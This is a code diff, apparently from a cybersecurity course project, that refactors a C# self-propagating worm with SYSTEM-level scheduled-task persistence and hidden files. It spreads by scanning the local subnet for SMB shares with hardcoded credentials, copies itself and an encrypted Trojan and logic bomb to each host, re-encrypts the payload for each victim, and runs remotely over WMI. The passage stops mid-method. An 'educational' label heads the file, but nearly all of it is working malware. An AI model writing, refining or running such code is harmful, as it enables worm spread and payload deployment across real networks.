@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Management;
 using System.Net.NetworkInformation;
+using System.Net.Sockets; // This namespace is needed for the Socket class
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
@@ -13,7 +14,7 @@ using SharedCrypto;
 
 /// <summary>
 /// EDUCATIONAL MALWARE SIMULATION - FOR CYBERSECURITY COURSE ONLY
-/// Self-Propagating Worm with Polymorphic Encryption and Persistence
+/// Self-Propagating Worm with Random Key Encryption and Persistence
 /// MUST ONLY BE RUN IN ISOLATED VM ENVIRONMENTS
 /// </summary>
 class Program
@@ -25,6 +26,7 @@ class Program
     private const string WORM_EXE_NAME = "Worm.exe";
     private const string LOGICBOMB_EXE_NAME = "LogicBomb.exe";
     private const string ENCRYPTED_BOMB_NAME = "bomb.encrypted";
+    private const string KEY_FILE_NAME = "key.dat";
     private const string SHARED_CRYPTO_DLL = "SharedCrypto.dll";
     private const string SHARED_CRYPTO_PDB = "SharedCrypto.pdb";
 
@@ -41,13 +43,12 @@ class Program
     {
         Console.WriteLine("===========================================");
         Console.WriteLine("PERSISTENT SELF-PROPAGATING WORM");
-        Console.WriteLine("Educational Malware Simulation");
+        Console.WriteLine("Educational Malware Simulation - Random Key Edition");
         Console.WriteLine("===========================================");
         Console.WriteLine();
 
         string baseDir = AppDomain.CurrentDomain.BaseDirectory;
 
-        // Create a timestamp for the unique log file name
         string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
         string logFileName = $"Worm_log_{timestamp}.txt";
         logFilePath = Path.Combine(baseDir, logFileName);
@@ -87,37 +88,34 @@ class Program
             string wormPath = Process.GetCurrentProcess().MainModule.FileName;
             string logicBombPath = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME, LOGICBOMB_EXE_NAME);
 
-            bool wormTaskCreated = CreateScheduledTask(WORM_TASK_NAME, wormPath);
-            if (wormTaskCreated)
+            if (CreateScheduledTask(WORM_TASK_NAME, wormPath))
             {
                 LogSuccess($"Worm persistence installed: {WORM_TASK_NAME}");
             }
             else
             {
-                LogWarning($"Failed to create Worm scheduled task - continuing anyway");
+                LogWarning($"Failed to create Worm scheduled task.");
             }
 
             if (File.Exists(logicBombPath))
             {
-                bool logicBombTaskCreated = CreateScheduledTask(LOGICBOMB_TASK_NAME, logicBombPath);
-                if (logicBombTaskCreated)
+                if (CreateScheduledTask(LOGICBOMB_TASK_NAME, logicBombPath))
                 {
                     LogSuccess($"LogicBomb persistence installed: {LOGICBOMB_TASK_NAME}");
                 }
                 else
                 {
-                    LogWarning($"Failed to create LogicBomb scheduled task - continuing anyway");
+                    LogWarning($"Failed to create LogicBomb scheduled task.");
                 }
             }
             else
             {
-                LogWarning($"LogicBomb.exe not found at {logicBombPath}, skipping persistence");
+                LogWarning($"LogicBomb.exe not found at {logicBombPath}, skipping persistence.");
             }
         }
         catch (Exception ex)
         {
             LogError($"Persistence installation failed: {ex.Message} - continuing anyway");
-            LogToFile($"Stack trace: {ex.StackTrace}");
         }
     }
 
@@ -125,48 +123,24 @@ class Program
     {
         try
         {
-            ProcessStartInfo deleteTask = new ProcessStartInfo
+            var deleteTask = new ProcessStartInfo("schtasks.exe", $"/Delete /TN \"{taskName}\" /F")
+            { CreateNoWindow = true, UseShellExecute = false };
+            Process.Start(deleteTask)?.WaitForExit();
+
+            var createTask = new ProcessStartInfo("schtasks.exe", $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /RU SYSTEM /RL HIGHEST /F")
             {
-                FileName = "schtasks.exe",
-                Arguments = $"/Delete /TN \"{taskName}\" /F",
                 CreateNoWindow = true,
                 UseShellExecute = false,
-                RedirectStandardOutput = true,
                 RedirectStandardError = true
             };
 
-            using (Process deleteProcess = Process.Start(deleteTask))
+            using (var process = Process.Start(createTask))
             {
-                deleteProcess.WaitForExit();
-            }
-
-            ProcessStartInfo createTask = new ProcessStartInfo
-            {
-                FileName = "schtasks.exe",
-                Arguments = $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /RU SYSTEM /RL HIGHEST /F",
-                CreateNoWindow = true,
-                UseShellExecute = false,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true
-            };
-
-            using (Process createProcess = Process.Start(createTask))
-            {
-                string output = createProcess.StandardOutput.ReadToEnd();
-                string error = createProcess.StandardError.ReadToEnd();
-                createProcess.WaitForExit();
-
-                if (createProcess.ExitCode == 0)
-                {
-                    LogToFile($"Scheduled task created: {taskName}");
-                    LogToFile($"Task executes: {exePath}");
-                    return true;
-                }
-                else
-                {
-                    LogToFile($"Failed to create task {taskName}: {error}");
-                    return false;
-                }
+                string error = process.StandardError.ReadToEnd();
+                process.WaitForExit();
+                if (process.ExitCode == 0) return true;
+                LogToFile($"Failed to create task {taskName}: {error}");
+                return false;
             }
         }
         catch (Exception ex)
@@ -181,40 +155,19 @@ class Program
         try
         {
             string baseDir = AppDomain.CurrentDomain.BaseDirectory;
-            string wormPath = Process.GetCurrentProcess().MainModule.FileName;
 
-            if (File.Exists(wormPath))
-            {
-                File.SetAttributes(wormPath, FileAttributes.Hidden | FileAttributes.System);
-                LogSuccess($"Set attributes for Worm.exe");
-            }
-
-            // Set attributes for SharedCrypto DLL and PDB
-            string dllPath = Path.Combine(baseDir, SHARED_CRYPTO_DLL);
-            if (File.Exists(dllPath))
-            {
-                File.SetAttributes(dllPath, FileAttributes.Hidden | FileAttributes.System);
-                LogSuccess($"Set attributes for {SHARED_CRYPTO_DLL}");
-            }
-
-            string pdbPath = Path.Combine(baseDir, SHARED_CRYPTO_PDB);
-            if (File.Exists(pdbPath))
-            {
-                File.SetAttributes(pdbPath, FileAttributes.Hidden | FileAttributes.System);
-                LogSuccess($"Set attributes for {SHARED_CRYPTO_PDB}");
-            }
+            SetHiddenSystemAttribute(Process.GetCurrentProcess().MainModule.FileName);
+            SetHiddenSystemAttribute(Path.Combine(baseDir, SHARED_CRYPTO_DLL));
+            SetHiddenSystemAttribute(Path.Combine(baseDir, SHARED_CRYPTO_PDB));
 
             string payloadDir = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);
             if (Directory.Exists(payloadDir))
             {
-                foreach (string file in Directory.GetFiles(payloadDir, "*.*", SearchOption.AllDirectories))
-                {
-                    try
-                    {
-                        File.SetAttributes(file, FileAttributes.Hidden | FileAttributes.System);
-                    }
-                    catch { }
-                }
+                SetHiddenSystemAttribute(Path.Combine(payloadDir, KEY_FILE_NAME));
+                SetHiddenSystemAttribute(Path.Combine(payloadDir, LOGICBOMB_EXE_NAME));
+                SetHiddenSystemAttribute(Path.Combine(payloadDir, ENCRYPTED_BOMB_NAME));
+                SetHiddenSystemAttribute(Path.Combine(payloadDir, SHARED_CRYPTO_DLL));
+                SetHiddenSystemAttribute(Path.Combine(payloadDir, SHARED_CRYPTO_PDB));
                 LogSuccess($"Set attributes for payload folder contents");
             }
         }
@@ -224,38 +177,30 @@ class Program
         }
     }
 
+    private static void SetHiddenSystemAttribute(string path)
+    {
+        if (File.Exists(path))
+        {
+            File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
+        }
+    }
+
     private static void StartLogicBombLocally()
     {
         try
         {
-            string logicBombPath = Path.Combine(
-                AppDomain.CurrentDomain.BaseDirectory,
-                PAYLOAD_FOLDER_NAME,
-                LOGICBOMB_EXE_NAME
-            );
-
+            string logicBombPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, PAYLOAD_FOLDER_NAME, LOGICBOMB_EXE_NAME);
             if (!File.Exists(logicBombPath))
             {
                 LogWarning("LogicBomb.exe not found, skipping local start");
                 return;
             }
-
-            var localProcesses = Process.GetProcessesByName("LogicBomb");
-            if (localProcesses.Length > 0)
+            if (Process.GetProcessesByName("LogicBomb").Any())
             {
                 LogInfo("LogicBomb already running locally");
                 return;
             }
-
-            ProcessStartInfo psi = new ProcessStartInfo
-            {
-                FileName = logicBombPath,
-                UseShellExecute = true,
-                CreateNoWindow = true,
-                WindowStyle = ProcessWindowStyle.Hidden
-            };
-
-            Process.Start(psi);
+            Process.Start(new ProcessStartInfo(logicBombPath) { UseShellExecute = true, CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
             LogSuccess("LogicBomb started locally");
         }
         catch (Exception ex)
@@ -267,56 +212,28 @@ class Program
     private static async Task ContinuousScanLoop()
     {
         int scanCount = 0;
-
         while (true)
         {
             scanCount++;
             LogInfo($"========== SCAN #{scanCount} ==========");
-            LogInfo($"Scan started at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
-
             try
             {
                 string localIP = GetLocalIPAddress();
-                if (localIP == null)
+                if (string.IsNullOrEmpty(localIP))
                 {
                     LogError("Could not detect local IP address, retrying in 10 minutes");
                 }
                 else
                 {
                     string baseIP = string.Join(".", localIP.Split('.').Take(3));
-                    LogInfo($"Local IP: {localIP}");
-                    LogInfo($"Scanning network: {baseIP}.1 - {baseIP}.254");
+                    LogInfo($"Local IP: {localIP}, Scanning network: {baseIP}.1 - {baseIP}.254");
 
-                    var progress = new Progress<ScanProgress>(p =>
-                    {
-                        if (p.Completed % 50 == 0)
-                        {
-                            LogToFile($"Scan progress: {p.Completed}/254 hosts checked, {p.ActiveSmb} targets found");
-                        }
-                    });
-
-                    List<string> smbHosts = await FindSmbServersAsync(baseIP, progress, CancellationToken.None);
-
+                    List<string> smbHosts = await FindSmbServersAsync(baseIP);
                     LogInfo($"Scan complete: Found {smbHosts.Count} SMB host(s)");
 
-                    if (smbHosts.Count > 0)
+                    foreach (string ip in smbHosts)
                     {
-                        string tempFolder = Path.Combine(Path.GetTempPath(), $"WormDeploy_{Guid.NewGuid():N}");
-                        PrepareDeploymentPackage(tempFolder);
-
-                        foreach (string ip in smbHosts)
-                        {
-                            await ProcessTargetHost(ip, tempFolder);
-                        }
-
-                        try
-                        {
-                            if (Directory.Exists(tempFolder))
-                            {
-                                Directory.Delete(tempFolder, true);
-                            }
-                        }
-                        catch { }
+                        await ProcessTargetHost(ip);
                     }
                 }
             }
@@ -325,258 +242,134 @@ class Program
                 LogError($"Error during scan #{scanCount}: {ex.Message}");
             }
 
-            LogInfo($"Scan #{scanCount} complete. Waiting {SCAN_INTERVAL_MINUTES} minutes before next scan...");
-            LogInfo($"Next scan at approximately {DateTime.Now.AddMinutes(SCAN_INTERVAL_MINUTES):yyyy-MM-dd HH:mm:ss}");
-            LogToFile("");
-
+            LogInfo($"Scan #{scanCount} complete. Waiting {SCAN_INTERVAL_MINUTES} minutes...");
             await Task.Delay(TimeSpan.FromMinutes(SCAN_INTERVAL_MINUTES));
         }
     }
 
-    private static async Task ProcessTargetHost(string ip, string tempFolder)
+    private static async Task ProcessTargetHost(string ip)
     {
         LogInfo($"--- Processing target: {ip} ---");
-        string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
-
         if (IsWormAlreadyRunningOnTarget(ip))
         {
             LogInfo($"Worm already running on {ip}, skipping");
             return;
         }
 
+        string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
         int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);
 
-        if (smbConnectResult == 0)
-        {
-            bool propagationSuccess = true;
-
-            try
-            {
-                LogSuccess($"Connected to {ip}");
-
-                // Step 1: Get victim Machine GUID
-                string victimMachineGuid = GetRemoteMachineGuid(ip, SMB_USERNAME, SMB_PASSWORD);
-                LogInfo($"Victim Machine GUID: {victimMachineGuid}");
-
-                // Step 2: Re-encrypt Trojan for victim
-                string victimSpecificBomb = Path.Combine(tempFolder, "bomb_victim.encrypted");
-                ReEncryptTrojanForVictim(tempFolder, victimSpecificBomb, victimMachineGuid);
-                LogSuccess($"Created victim-specific encrypted payload");
-
-                // Step 3: Copy Worm.exe and dependencies
-                try
-                {
-                    string localWormPath = Path.Combine(tempFolder, WORM_EXE_NAME);
-                    string remoteWormPath = Path.Combine(remoteShareUNC, WORM_EXE_NAME);
-                    File.Copy(localWormPath, remoteWormPath, true);
-                    LogSuccess($"Copied {WORM_EXE_NAME}");
-                }
-                catch (Exception ex)
-                {
-                    LogError($"Failed to copy Worm.exe: {ex.Message}");
-                    propagationSuccess = false;
-                }
-
-                if (propagationSuccess)
-                {
-                    try
-                    {
-                        string localDllPath = Path.Combine(tempFolder, SHARED_CRYPTO_DLL);
-                        string remoteDllPath = Path.Combine(remoteShareUNC, SHARED_CRYPTO_DLL);
-                        File.Copy(localDllPath, remoteDllPath, true);
-                        LogSuccess($"Copied {SHARED_CRYPTO_DLL}");
-                    }
-                    catch (Exception ex)
-                    {
-                        LogError($"Failed to copy {SHARED_CRYPTO_DLL}: {ex.Message}");
-                        propagationSuccess = false;
-                    }
-                }
-
-                if (propagationSuccess)
-                {
-                    try
-                    {
-                        string localPdbPath = Path.Combine(tempFolder, SHARED_CRYPTO_PDB);
-                        string remotePdbPath = Path.Combine(remoteShareUNC, SHARED_CRYPTO_PDB);
-                        File.Copy(localPdbPath, remotePdbPath, true);
-                        LogSuccess($"Copied {SHARED_CRYPTO_PDB}");
-                    }
-                    catch (Exception ex)
-                    {
-                        LogError($"Failed to copy {SHARED_CRYPTO_PDB}: {ex.Message}");
-                        propagationSuccess = false;
-                    }
-                }
-
-                // Step 4: Copy payload folder
-                if (propagationSuccess)
-                {
-                    try
-                    {
-                        string localPayloadFolder = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME);
-                        string remotePayloadFolder = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME);
-
-                        // Create remote payload directory
-                        if (!Directory.Exists(remotePayloadFolder))
-                        {
-                            Directory.CreateDirectory(remotePayloadFolder);
-                            LogSuccess($"Created payload directory on {ip}");
-                        }
-
-                        await CopyFolderAsync(localPayloadFolder, remotePayloadFolder);
-                        LogSuccess($"Copied payload folder contents to {ip}");
-                    }
-                    catch (Exception ex)
-                    {
-                        LogError($"Failed to copy payload folder: {ex.Message}");
-                        propagationSuccess = false;
-                    }
-                }
-
-                // Step 5: Overwrite bomb.encrypted with victim-specific version
-                if (propagationSuccess)
-                {
-                    try
-                    {
-                        string remoteBombPath = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME, ENCRYPTED_BOMB_NAME);
-
-                        // Delete old bomb if exists
-                        if (File.Exists(remoteBombPath))
-                        {
-                            File.Delete(remoteBombPath);
-                        }
-
-                        File.Copy(victimSpecificBomb, remoteBombPath, true);
-                        LogSuccess($"Deployed victim-specific encrypted payload");
-                    }
-                    catch (Exception ex)
-                    {
-                        LogError($"Failed to deploy victim-specific bomb: {ex.Message}");
-                        propagationSuccess = false;
-                    }
-                }
-
-                // Step 6: Set file attributes
-                if (propagationSuccess)
-                {
-                    SetRemoteFileAttributes(ip, remoteShareUNC);
-                }
-
-                // Step 7: Execute Worm on victim
-                if (propagationSuccess)
-                {
-                    string remoteWormExePath = $"C:\\{SMB_SHARE_NAME}\\{WORM_EXE_NAME}";
-                    LogInfo($"Attempting to execute Worm remotely on {ip}...");
-
-                    bool wormExecuted = ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath, "Worm");
-
-                    if (wormExecuted)
-                    {
-                        LogSuccess($"Successfully propagated to {ip} (Worm will handle LogicBomb locally)");
-                    }
-                    else
-                    {
-                        LogWarning($"File copy succeeded but WMI execution failed on {ip}");
-                    }
-                }
-                else
-                {
-                    LogError($"Propagation to {ip} failed due to file copy errors");
-                }
-
-                // Cleanup temp file
-                if (File.Exists(victimSpecificBomb))
-                {
-                    try
-                    {
-                        File.Delete(victimSpecificBomb);
-                    }
-                    catch { }
-                }
-            }
-            catch (Exception ex)
-            {
-                LogError($"Error processing {ip}: {ex.Message}");
-                LogToFile($"Stack trace: {ex.StackTrace}");
-            }
-            finally
-            {
-                DisconnectFromRemoteShare(remoteShareUNC);
-            }
-        }
-        else
+        if (smbConnectResult != 0)
         {
             LogWarning($"SMB connection to {ip} failed - Error: {GetWNetErrorDescription(smbConnectResult)}");
+            return;
         }
 
-        Console.WriteLine();
+        LogSuccess($"Connected to {ip}");
+        string victimPackagePath = null;
+        try
+        {
+            victimPackagePath = Path.Combine(Path.GetTempPath(), $"WormDeploy_{Guid.NewGuid():N}");
+            PrepareVictimSpecificPackage(victimPackagePath);
+
+            await CopyFolderAsync(victimPackagePath, remoteShareUNC);
+            LogSuccess($"Copied victim-specific package to {ip}");
+
+            SetRemoteFileAttributes(ip, remoteShareUNC);
+
+            string remoteWormExePath = $"C:\\{SMB_SHARE_NAME}\\{WORM_EXE_NAME}";
+            LogInfo($"Attempting to execute Worm remotely on {ip}...");
+            if (ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath))
+            {
+                LogSuccess($"Successfully propagated to {ip}");
+            }
+            else
+            {
+                LogWarning($"File copy succeeded but WMI execution failed on {ip}");
+            }
+        }
+        catch (Exception ex)
+        {
+            LogError($"Error processing {ip}: {ex.Message}");
+            LogToFile($"Stack trace: {ex.StackTrace}");
+        }
+        finally
+        {
+            DisconnectFromRemoteShare(remoteShareUNC);
+            if (victimPackagePath != null && Directory.Exists(victimPackagePath))
+            {
+                try { Directory.Delete(victimPackagePath, true); } catch { }
+            }
+        }
+    }
+
+    private static void PrepareVictimSpecificPackage(string tempPackagePath)
+    {
+        LogInfo("Preparing unique encrypted package for victim...");
+        Directory.CreateDirectory(tempPackagePath);
+
+        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
+        string basePayloadDir = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);
+        string tempPayloadDir = Path.Combine(tempPackagePath, PAYLOAD_FOLDER_NAME);
+        Directory.CreateDirectory(tempPayloadDir);
+
+        File.Copy(Path.Combine(baseDir, WORM_EXE_NAME), Path.Combine(tempPackagePath, WORM_EXE_NAME));
+        File.Copy(Path.Combine(baseDir, SHARED_CRYPTO_DLL), Path.Combine(tempPackagePath, SHARED_CRYPTO_DLL));
+        if (File.Exists(Path.Combine(baseDir, SHARED_CRYPTO_PDB)))
+            File.Copy(Path.Combine(baseDir, SHARED_CRYPTO_PDB), Path.Combine(tempPackagePath, SHARED_CRYPTO_PDB));
+
+        File.Copy(Path.Combine(basePayloadDir, LOGICBOMB_EXE_NAME), Path.Combine(tempPayloadDir, LOGICBOMB_EXE_NAME));
+        File.Copy(Path.Combine(basePayloadDir, SHARED_CRYPTO_DLL), Path.Combine(tempPayloadDir, SHARED_CRYPTO_DLL));
+        if (File.Exists(Path.Combine(basePayloadDir, SHARED_CRYPTO_PDB)))
+            File.Copy(Path.Combine(basePayloadDir, SHARED_CRYPTO_PDB), Path.Combine(tempPayloadDir, SHARED_CRYPTO_PDB));
+
+        string oldKey = File.ReadAllText(Path.Combine(basePayloadDir, KEY_FILE_NAME));
+        string newKey = CryptoUtils.GenerateRandomKey();
+        LogInfo($"Re-encrypting payload with new key: {newKey}");
+
+        string originalBombPath = Path.Combine(basePayloadDir, ENCRYPTED_BOMB_NAME);
+        string tempTrojanPath = Path.Combine(tempPackagePath, "Trojan.exe");
+        string finalBombPath = Path.Combine(tempPayloadDir, ENCRYPTED_BOMB_NAME);
+
+        CryptoUtils.DecryptFile(originalBombPath, tempTrojanPath, oldKey);
+        CryptoUtils.EncryptFile(tempTrojanPath, finalBombPath, newKey);
+
+        File.WriteAllText(Path.Combine(tempPayloadDir, KEY_FILE_NAME), newKey);
+
+        File.Delete(tempTrojanPath);
+        LogSuccess("Victim-specific package created successfully.");
     }
 
     private static bool IsWormAlreadyRunningOnTarget(string remoteIp)
     {
         try
         {
-            ConnectionOptions connOpts = new ConnectionOptions
-            {
-                Username = SMB_USERNAME,
-                Password = SMB_PASSWORD,
-                Impersonation = ImpersonationLevel.Impersonate,
-                Authentication = AuthenticationLevel.Default,
-                Timeout = TimeSpan.FromSeconds(10)
-            };
-
-            string path = $"\\\\{remoteIp}\\root\\cimv2";
-            var scope = new ManagementScope(path, connOpts);
+            var connOpts = new ConnectionOptions { Username = SMB_USERNAME, Password = SMB_PASSWORD, Timeout = TimeSpan.FromSeconds(10) };
+            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
             scope.Connect();
-
-            string query = "SELECT * FROM Win32_Process WHERE Name = 'Worm.exe'";
-            var searcher = new ManagementObjectSearcher(scope, new ObjectQuery(query));
-            var results = searcher.Get();
-
-            return results.Count > 0;
+            var searcher = new ManagementObjectSearcher(scope, new ObjectQuery("SELECT * FROM Win32_Process WHERE Name = 'Worm.exe'"));
+            return searcher.Get().Count > 0;
         }
-        catch
-        {
-            return false;
-        }
+        catch { return false; }
     }
 
     private static void SetRemoteFileAttributes(string remoteIp, string remoteShareUNC)
     {
         try
         {
-            string remoteWormPath = Path.Combine(remoteShareUNC, WORM_EXE_NAME);
-            if (File.Exists(remoteWormPath))
-            {
-                File.SetAttributes(remoteWormPath, FileAttributes.Hidden | FileAttributes.System);
-            }
-
-            string remoteDllPath = Path.Combine(remoteShareUNC, SHARED_CRYPTO_DLL);
-            if (File.Exists(remoteDllPath))
-            {
-                File.SetAttributes(remoteDllPath, FileAttributes.Hidden | FileAttributes.System);
-            }
-
-            string remotePdbPath = Path.Combine(remoteShareUNC, SHARED_CRYPTO_PDB);
-            if (File.Exists(remotePdbPath))
-            {
-                File.SetAttributes(remotePdbPath, FileAttributes.Hidden | FileAttributes.System);
-            }
+            SetHiddenSystemAttribute(Path.Combine(remoteShareUNC, WORM_EXE_NAME));
+            SetHiddenSystemAttribute(Path.Combine(remoteShareUNC, SHARED_CRYPTO_DLL));
+            SetHiddenSystemAttribute(Path.Combine(remoteShareUNC, SHARED_CRYPTO_PDB));
 
             string remotePayloadFolder = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME);
             if (Directory.Exists(remotePayloadFolder))
             {
-                foreach (string file in Directory.GetFiles(remotePayloadFolder, "*.*", SearchOption.AllDirectories))
-                {
-                    try
-                    {
-                        File.SetAttributes(file, FileAttributes.Hidden | FileAttributes.System);
-                    }
-                    catch { }
-                }
+                SetHiddenSystemAttribute(Path.Combine(remotePayloadFolder, KEY_FILE_NAME));
+                SetHiddenSystemAttribute(Path.Combine(remotePayloadFolder, LOGICBOMB_EXE_NAME));
+                SetHiddenSystemAttribute(Path.Combine(remotePayloadFolder, ENCRYPTED_BOMB_NAME));
+                SetHiddenSystemAttribute(Path.Combine(remotePayloadFolder, SHARED_CRYPTO_DLL));
+                SetHiddenSystemAttribute(Path.Combine(remotePayloadFolder, SHARED_CRYPTO_PDB));
             }
-
             LogSuccess($"Set file attributes on {remoteIp}");
         }
         catch (Exception ex)
@@ -585,221 +378,64 @@ class Program
         }
     }
 
-    private static string GetRemoteMachineGuid(string remoteIp, string username, string password)
-    {
-        LogInfo($"Querying Machine GUID from {remoteIp}...");
-
-        try
-        {
-            ConnectionOptions connOpts = new ConnectionOptions
-            {
-                Username = username,
-                Password = password,
-                Impersonation = ImpersonationLevel.Impersonate,
-                Authentication = AuthenticationLevel.Default,
-                EnablePrivileges = true,
-                Timeout = TimeSpan.FromSeconds(15)
-            };
-
-            string path = $"\\\\{remoteIp}\\root\\CIMV2";
-            var scope = new ManagementScope(path, connOpts);
-            scope.Connect();
-
-            var regProv = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
-
-            var inParams = regProv.GetMethodParameters("GetStringValue");
-            inParams["hDefKey"] = 0x80000002;
-            inParams["sSubKeyName"] = @"SOFTWARE\Microsoft\Cryptography";
-            inParams["sValueName"] = "MachineGuid";
-
-            var outParams = regProv.InvokeMethod("GetStringValue", inParams, null);
-
-            if (outParams != null && outParams["sValue"] != null)
-            {
-                string guid = outParams["sValue"].ToString();
-                if (!string.IsNullOrEmpty(guid))
-                {
-                    return guid;
-                }
-            }
-        }
-        catch (Exception ex)
-        {
-            LogWarning($"Failed to get Machine GUID from {remoteIp}: {ex.Message}");
-        }
-
-        return "DEFAULT_MACHINE_ID";
-    }
-
-    private static void ReEncryptTrojanForVictim(string tempFolder, string outputPath, string victimMachineGuid)
-    {
-        string trojanPath = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME, "Trojan.exe");
-
-        if (!File.Exists(trojanPath))
-        {
-            string localBombPath = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME, ENCRYPTED_BOMB_NAME);
-            if (File.Exists(localBombPath))
-            {
-                string localMachineGuid = CryptoUtils.GetMachineGuid();
-                CryptoUtils.DecryptFile(localBombPath, trojanPath, localMachineGuid);
-            }
-            else
-            {
-                throw new FileNotFoundException($"Trojan.exe not found at {trojanPath}");
-            }
-        }
-
-        CryptoUtils.EncryptFile(trojanPath, outputPath, victimMachineGuid);
-    }
-
-    private static async Task<List<string>> FindSmbServersAsync(
-        string baseIP,
-        IProgress<ScanProgress> progress = null,
-        CancellationToken cancellationToken = default)
+    private static async Task<List<string>> FindSmbServersAsync(string baseIP)
     {
         var activeHosts = new List<string>();
-        var pingTasks = new List<Task>();
         var semaphore = new SemaphoreSlim(MAX_CONCURRENT_SCANS);
-        int completed = 0;
-        int activeSmbCount = 0;
-
-        for (int i = 1; i <= 254; i++)
+        var tasks = Enumerable.Range(1, 254).Select(async i =>
         {
-            if (cancellationToken.IsCancellationRequested)
-                break;
-
             string ip = $"{baseIP}.{i}";
-            await semaphore.WaitAsync(cancellationToken);
-
-            pingTasks.Add(Task.Run(async () =>
+            await semaphore.WaitAsync();
+            try
             {
-                try
+                using (var ping = new Ping())
                 {
-                    using (var ping = new Ping())
+                    if ((await ping.SendPingAsync(ip, PING_TIMEOUT_MS)).Status == IPStatus.Success)
                     {
-                        var reply = await ping.SendPingAsync(ip, PING_TIMEOUT_MS);
-
-                        if (reply.Status == IPStatus.Success)
+                        if (ConnectToRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}", SMB_USERNAME, SMB_PASSWORD) == 0)
                         {
-                            string smbPath = $"\\\\{ip}\\{SMB_SHARE_NAME}";
-                            int result = ConnectToRemoteShare(smbPath, SMB_USERNAME, SMB_PASSWORD);
-
-                            if (result == 0)
-                            {
-                                lock (activeHosts)
-                                {
-                                    activeHosts.Add(ip);
-                                    activeSmbCount++;
-                                }
-                                DisconnectFromRemoteShare(smbPath);
-                            }
+                            lock (activeHosts) activeHosts.Add(ip);
+                            DisconnectFromRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}");
                         }
                     }
                 }
-                catch { }
-                finally
-                {
-                    semaphore.Release();
-                    int currentCompleted = Interlocked.Increment(ref completed);
-                    progress?.Report(new ScanProgress
-                    {
-                        Completed = currentCompleted,
-                        ActiveSmb = activeSmbCount
-                    });
-                }
-            }, cancellationToken));
-        }
-
-        await Task.WhenAll(pingTasks);
+            }
+            catch { }
+            finally { semaphore.Release(); }
+        });
+        await Task.WhenAll(tasks);
         return activeHosts;
-    }
-
-    private static void PrepareDeploymentPackage(string tempFolder)
-    {
-        Directory.CreateDirectory(tempFolder);
-
-        string exePath = Process.GetCurrentProcess().MainModule.FileName;
-        File.Copy(exePath, Path.Combine(tempFolder, Path.GetFileName(exePath)), overwrite: true);
-
-        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
-
-        // Copy SharedCrypto DLL and PDB
-        string dllPath = Path.Combine(baseDir, SHARED_CRYPTO_DLL);
-        if (File.Exists(dllPath))
-        {
-            File.Copy(dllPath, Path.Combine(tempFolder, SHARED_CRYPTO_DLL), overwrite: true);
-        }
-
-        string pdbPath = Path.Combine(baseDir, SHARED_CRYPTO_PDB);
-        if (File.Exists(pdbPath))
-        {
-            File.Copy(pdbPath, Path.Combine(tempFolder, SHARED_CRYPTO_PDB), overwrite: true);
-        }
-
-        string payloadFolder = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);
-        if (Directory.Exists(payloadFolder))
-        {
-            CopyFolderSync(payloadFolder, Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME));
-        }
-    }
-
-    private static void CopyFolderSync(string source, string dest)
-    {
-        Directory.CreateDirectory(dest);
-
-        foreach (string file in Directory.GetFiles(source))
-        {
-            string fileName = Path.GetFileName(file);
-            File.Copy(file, Path.Combine(dest, fileName), true);
-        }
-
-        foreach (string dir in Directory.GetDirectories(source))
-        {
-            string dirName = Path.GetFileName(dir);
-            CopyFolderSync(dir, Path.Combine(dest, dirName));
-        }
     }
 
     private static async Task CopyFolderAsync(string source, string dest)
     {
-        // Ensure destination directory exists
-        if (!Directory.Exists(dest))
-        {
-            Directory.CreateDirectory(dest);
-        }
-
-        // Copy all files
-        foreach (string file in Directory.GetFiles(source))
+        Directory.CreateDirectory(dest);
+        var files = Directory.GetFiles(source).Select(async file =>
         {
             try
             {
-                string fileName = Path.GetFileName(file);
-                string destFile = Path.Combine(dest, fileName);
-                await Task.Run(() => File.Copy(file, destFile, true));
+                await Task.Run(() => File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true));
             }
-            catch (Exception ex)
-            {
-                // Log but continue with other files
-                LogWarning($"Failed to copy {Path.GetFileName(file)}: {ex.Message}");
-            }
-        }
-
-        // Recursively copy subdirectories
-        foreach (string dir in Directory.GetDirectories(source))
-        {
-            string dirName = Path.GetFileName(dir);
-            await CopyFolderAsync(dir, Path.Combine(dest, dirName));
-        }
+            catch (Exception ex) { LogWarning($"Failed to copy {Path.GetFileName(file)}: {ex.Message}"); }
+        });
+        var dirs = Directory.GetDirectories(source).Select(dir => CopyFolderAsync(dir, Path.Combine(dest, Path.GetFileName(dir))));
+        await Task.WhenAll(files.Concat(dirs));
     }
 
+    // --- FIXED: Corrected GetLocalIPAddress method ---
     private static string GetLocalIPAddress()
     {
         try
         {
-            var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
-            return host.AddressList
